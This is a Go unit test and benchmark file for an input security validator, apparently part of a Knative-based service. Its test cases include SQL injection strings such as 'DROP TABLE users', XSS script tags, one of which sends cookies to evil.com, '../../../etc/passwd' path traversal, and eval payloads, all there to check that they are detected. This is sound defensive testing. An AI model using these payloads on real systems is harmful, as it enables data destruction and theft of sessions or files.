package security

import (
	"context"
	"fmt"
	"strings"
	"testing"
	"time"

	"knative-lambda-new/internal/observability"
)

func TestSecurityValidator_ValidateInput_WithObservability(t *testing.T) {
	// Create observability instance for testing
	obs, err := observability.New(observability.Config{
		ServiceName:    "test-service",
		ServiceVersion: "1.0.0",
		Environment:    "test",
		LogLevel:       "debug",
		MetricsEnabled: true,
		TracingEnabled: true,
		OTLPEndpoint:   "localhost:4317",
		SampleRate:     1.0,
	})
	if err != nil {
		t.Fatalf("Failed to create observability instance: %v", err)
	}

	// Create security validator
	validator := NewSecurityValidator(obs)

	tests := []struct {
		name           string
		input          string
		expectedValid  bool
		expectedError  string
		expectedThreat bool
	}{
		{
			name:          "Valid input",
			input:         "normal-user-input",
			expectedValid: true,
		},
		{
			name:          "Empty input",
			input:         "",
			expectedValid: false,
			expectedError: "input cannot be empty",
		},
		{
			name:           "SQL injection attempt",
			input:          "'; DROP TABLE users; --",
			expectedValid:  false,
			expectedError:  "input contains potential SQL injection",
			expectedThreat: true,
		},
		{
			name:           "XSS attempt",
			input:          "<script>alert(\"xss\")</script>",
			expectedValid:  false,
			expectedError:  "input contains potential XSS attack",
			expectedThreat: true,
		},
		{
			name:           "Path traversal attempt",
			input:          "../../../etc/passwd",
			expectedValid:  false,
			expectedError:  "input contains potential path traversal",
			expectedThreat: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			result := validator.ValidateInput(ctx, tt.input)

			if result.Valid != tt.expectedValid {
				t.Errorf("ValidateInput() valid = %v, want %v", result.Valid, tt.expectedValid)
			}

			if tt.expectedError != "" {
				if result.Error == nil {
					t.Errorf("ValidateInput() expected error '%s', got nil", tt.expectedError)
				} else if !strings.Contains(result.Error.Error(), tt.expectedError) {
					t.Errorf("ValidateInput() error = %v, want to contain %v", result.Error.Error(), tt.expectedError)
				}
			}

			if tt.expectedThreat && result.Valid {
				t.Errorf("ValidateInput() expected threat detection, but validation passed")
			}
		})
	}
}

func TestSecurityValidator_ValidateImageName_WithObservability(t *testing.T) {
	obs, err := observability.New(observability.Config{
		ServiceName:    "test-service",
		ServiceVersion: "1.0.0",
		Environment:    "test",
		LogLevel:       "debug",
		MetricsEnabled: true,
		TracingEnabled: true,
		OTLPEndpoint:   "localhost:4317",
		SampleRate:     1.0,
	})
	if err != nil {
		t.Fatalf("Failed to create observability instance: %v", err)
	}

	validator := NewSecurityValidator(obs)

	tests := []struct {
		name           string
		imageName      string
		expectedValid  bool
		expectedError  string
		expectedThreat bool
	}{
		{
			name:          "Valid image name",
			imageName:     "myapp:latest",
			expectedValid: true,
		},
		{
			name:          "Valid image name without tag",
			imageName:     "myapp",
			expectedValid: true,
		},
		{
			name:          "Empty image name",
			imageName:     "",
			expectedValid: false,
			expectedError: "image name cannot be empty",
		},
		{
			name:          "Invalid image name format",
			imageName:     "my-app@latest",
			expectedValid: false,
			expectedError: "invalid image name format",
		},
		{
			name:           "Malicious image name",
			imageName:      "eval:latest",
			expectedValid:  false,
			expectedError:  "image name contains potentially malicious patterns",
			expectedThreat: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			result := validator.ValidateImageName(ctx, tt.imageName)

			if result.Valid != tt.expectedValid {
				t.Errorf("ValidateImageName() valid = %v, want %v", result.Valid, tt.expectedValid)
			}

			if tt.expectedError != "" {
				if result.Error == nil {
					t.Errorf("ValidateImageName() expected error '%s', got nil", tt.expectedError)
				} else if !strings.Contains(result.Error.Error(), tt.expectedError) {
					t.Errorf("ValidateImageName() error = %v, want to contain %v", result.Error.Error(), tt.expectedError)
				}
			}

			if tt.expectedThreat && result.Valid {
				t.Errorf("ValidateImageName() expected threat detection, but validation passed")
			}
		})
	}
}

func TestSecurityValidator_ValidateNamespace_WithObservability(t *testing.T) {
	obs, err := observability.New(observability.Config{
		ServiceName:    "test-service",
		ServiceVersion: "1.0.0",
		Environment:    "test",
		LogLevel:       "debug",
		MetricsEnabled: true,
		TracingEnabled: true,
		OTLPEndpoint:   "localhost:4317",
		SampleRate:     1.0,
	})
	if err != nil {
		t.Fatalf("Failed to create observability instance: %v", err)
	}

	validator := NewSecurityValidator(obs)

	tests := []struct {
		name             string
		namespace        string
		expectedValid    bool
		expectedError    string
		expectedWarnings int
	}{
		{
			name:          "Valid namespace",
			namespace:     "my-app",
			expectedValid: true,
		},
		{
			name:          "Empty namespace",
			namespace:     "",
			expectedValid: false,
			expectedError: "namespace cannot be empty",
		},
		{
			name:          "Invalid namespace format",
			namespace:     "MyApp",
			expectedValid: false,
			expectedError: "invalid namespace format",
		},
		{
			name:             "Reserved namespace",
			namespace:        "kube-system",
			expectedValid:    true,
			expectedWarnings: 1,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			result := validator.ValidateNamespace(ctx, tt.namespace)

			if result.Valid != tt.expectedValid {
				t.Errorf("ValidateNamespace() valid = %v, want %v", result.Valid, tt.expectedValid)
			}

			if tt.expectedError != "" {
				if result.Error == nil {
					t.Errorf("ValidateNamespace() expected error '%s', got nil", tt.expectedError)
				} else if !strings.Contains(result.Error.Error(), tt.expectedError) {
					t.Errorf("ValidateNamespace() error = %v, want to contain %v", result.Error.Error(), tt.expectedError)
				}
			}

			if len(result.Warnings) != tt.expectedWarnings {
				t.Errorf("ValidateNamespace() warnings count = %d, want %d", len(result.Warnings), tt.expectedWarnings)
			}
		})
	}
}

func TestSecurityValidator_ValidateEventData_WithObservability(t *testing.T) {
	obs, err := observability.New(observability.Config{
		ServiceName:    "test-service",
		ServiceVersion: "1.0.0",
		Environment:    "test",
		LogLevel:       "debug",
		MetricsEnabled: true,
		TracingEnabled: true,
		OTLPEndpoint:   "localhost:4317",
		SampleRate:     1.0,
	})
	if err != nil {
		t.Fatalf("Failed to create observability instance: %v", err)
	}

	validator := NewSecurityValidator(obs)

	tests := []struct {
		name           string
		data           interface{}
		expectedValid  bool
		expectedError  string
		expectedThreat bool
	}{
		{
			name:          "Valid data",
			data:          "normal event data",
			expectedValid: true,
		},
		{
			name:          "Valid structured data",
			data:          map[string]interface{}{"key": "value"},
			expectedValid: true,
		},
		{
			name:          "Nil data",
			data:          nil,
			expectedValid: false,
			expectedError: "event data cannot be nil",
		},
		{
			name:           "Malicious string data",
			data:           "eval('malicious code')",
			expectedValid:  false,
			expectedError:  "event data contains potentially malicious content",
			expectedThreat: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			result := validator.ValidateEventData(ctx, tt.data)

			if result.Valid != tt.expectedValid {
				t.Errorf("ValidateEventData() valid = %v, want %v", result.Valid, tt.expectedValid)
			}

			if tt.expectedError != "" {
				if result.Error == nil {
					t.Errorf("ValidateEventData() expected error '%s', got nil", tt.expectedError)
				} else if result.Error.Error() != tt.expectedError {
					t.Errorf("ValidateEventData() error = %v, want %v", result.Error.Error(), tt.expectedError)
				}
			}

			if tt.expectedThreat && result.Valid {
				t.Errorf("ValidateEventData() expected threat detection, but validation passed")
			}
		})
	}
}

func TestSecurityValidator_ValidateID_WithObservability(t *testing.T) {
	obs, err := observability.New(observability.Config{
		ServiceName:    "test-service",
		ServiceVersion: "1.0.0",
		Environment:    "test",
		LogLevel:       "debug",
		MetricsEnabled: true,
		TracingEnabled: true,
		OTLPEndpoint:   "localhost:4317",
		SampleRate:     1.0,
	})
	if err != nil {
		t.Fatalf("Failed to create observability instance: %v", err)
	}

	validator := NewSecurityValidator(obs)

	tests := []struct {
		name           string
		id             string
		expectedValid  bool
		expectedError  string
		expectedThreat bool
	}{
		{
			name:          "Valid ID",
			id:            "user-123",
			expectedValid: true,
		},
		{
			name:          "Empty ID",
			id:            "",
			expectedValid: false,
			expectedError: "ID cannot be empty",
		},
		{
			name:          "Invalid ID format",
			id:            "user@123",
			expectedValid: false,
			expectedError: "invalid ID format",
		},
		{
			name:           "Malicious ID",
			id:             "admin",
			expectedValid:  false,
			expectedError:  "ID contains potentially malicious patterns",
			expectedThreat: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			result := validator.ValidateID(ctx, tt.id)

			if result.Valid != tt.expectedValid {
				t.Errorf("ValidateID() valid = %v, want %v", result.Valid, tt.expectedValid)
			}

			if tt.expectedError != "" {
				if result.Error == nil {
					t.Errorf("ValidateID() expected error '%s', got nil", tt.expectedError)
				} else if !strings.Contains(result.Error.Error(), tt.expectedError) {
					t.Errorf("ValidateID() error = %v, want to contain %v", result.Error.Error(), tt.expectedError)
				}
			}

			if tt.expectedThreat && result.Valid {
				t.Errorf("ValidateID() expected threat detection, but validation passed")
			}
		})
	}
}

func TestSecurityValidator_Performance_WithObservability(t *testing.T) {
	obs, err := observability.New(observability.Config{
		ServiceName:    "test-service",
		ServiceVersion: "1.0.0",
		Environment:    "test",
		LogLevel:       "debug",
		MetricsEnabled: true,
		TracingEnabled: true,
		OTLPEndpoint:   "localhost:4317",
		SampleRate:     1.0,
	})
	if err != nil {
		t.Fatalf("Failed to create observability instance: %v", err)
	}

	validator := NewSecurityValidator(obs)

	// Test performance with multiple validations
	ctx := context.Background()
	start := time.Now()

	for i := 0; i < 100; i++ {
		result := validator.ValidateInput(ctx, "normal-input")
		if !result.Valid {
			t.Errorf("Expected valid input, got invalid")
		}
	}

	duration := time.Since(start)
	if duration > 5*time.Second {
		t.Errorf("Performance test took too long: %v", duration)
	}

	t.Logf("Processed 100 validations in %v", duration)
}

func TestSecurityValidator_ThreatDetection_WithObservability(t *testing.T) {
	obs, err := observability.New(observability.Config{
		ServiceName:    "test-service",
		ServiceVersion: "1.0.0",
		Environment:    "test",
		LogLevel:       "debug",
		MetricsEnabled: true,
		TracingEnabled: true,
		OTLPEndpoint:   "localhost:4317",
		SampleRate:     1.0,
	})
	if err != nil {
		t.Fatalf("Failed to create observability instance: %v", err)
	}

	validator := NewSecurityValidator(obs)

	threatTests := []struct {
		name           string
		input          string
		expectedThreat bool
		threatType     SecurityEventType
	}{
		{
			name:           "SQL injection",
			input:          "'; SELECT * FROM users; --",
			expectedThreat: true,
			threatType:     EventTypeSQLInjectionDetected,
		},
		{
			name:           "XSS attack",
			input:          "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
			expectedThreat: true,
			threatType:     EventTypeXSSDetected,
		},
		{
			name:           "Path traversal",
			input:          "../../../etc/passwd",
			expectedThreat: true,
			threatType:     EventTypePathTraversalDetected,
		},
		{
			name:           "Malicious content",
			input:          "eval('malicious code execution')",
			expectedThreat: true,
			threatType:     EventTypeMaliciousContentDetected,
		},
	}

	for _, tt := range threatTests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			result := validator.ValidateInput(ctx, tt.input)

			if tt.expectedThreat && result.Valid {
				t.Errorf("Expected threat detection for input: %s", tt.input)
			}

			if !tt.expectedThreat && !result.Valid {
				t.Errorf("Unexpected validation failure for input: %s", tt.input)
			}
		})
	}
}

func TestSecurityValidator_ConcurrentAccess_WithObservability(t *testing.T) {
	obs, err := observability.New(observability.Config{
		ServiceName:    "test-service",
		ServiceVersion: "1.0.0",
		Environment:    "test",
		LogLevel:       "debug",
		MetricsEnabled: true,
		TracingEnabled: true,
		OTLPEndpoint:   "localhost:4317",
		SampleRate:     1.0,
	})
	if err != nil {
		t.Fatalf("Failed to create observability instance: %v", err)
	}

	validator := NewSecurityValidator(obs)

	// Test concurrent access
	done := make(chan bool, 10)
	for i := 0; i < 10; i++ {
		go func(id int) {
			ctx := context.Background()
			input := fmt.Sprintf("user-input-%d", id)
			result := validator.ValidateInput(ctx, input)
			if !result.Valid {
				t.Errorf("Concurrent validation failed for input: %s", input)
			}
			done <- true
		}(i)
	}

	// Wait for all goroutines to complete
	for i := 0; i < 10; i++ {
		<-done
	}
}

// Benchmark tests for performance measurement
func BenchmarkSecurityValidator_ValidateInput(b *testing.B) {
	obs, err := observability.New(observability.Config{
		ServiceName:    "test-service",
		ServiceVersion: "1.0.0",
		Environment:    "test",
		LogLevel:       "debug",
		MetricsEnabled: true,
		TracingEnabled: true,
		OTLPEndpoint:   "localhost:4317",
		SampleRate:     1.0,
	})
	if err != nil {
		b.Fatalf("Failed to create observability instance: %v", err)
	}

	validator := NewSecurityValidator(obs)
	ctx := context.Background()

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		validator.ValidateInput(ctx, "normal-user-input")
	}
}

func BenchmarkSecurityValidator_ValidateInput_WithThreats(b *testing.B) {
	obs, err := observability.New(observability.Config{
		ServiceName:    "test-service",
		ServiceVersion: "1.0.0",
		Environment:    "test",
		LogLevel:       "debug",
		MetricsEnabled: true,
		TracingEnabled: true,
		OTLPEndpoint:   "localhost:4317",
		SampleRate:     1.0,
	})
	if err != nil {
		b.Fatalf("Failed to create observability instance: %v", err)
	}

	validator := NewSecurityValidator(obs)
	ctx := context.Background()

	threatInputs := []string{
		"'; DROP TABLE users; --",
		"<script>alert('xss')</script>",
		"../../../etc/passwd",
		"eval('malicious code')",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		input := threatInputs[i%len(threatInputs)]
		validator.ValidateInput(ctx, input)
	}
}
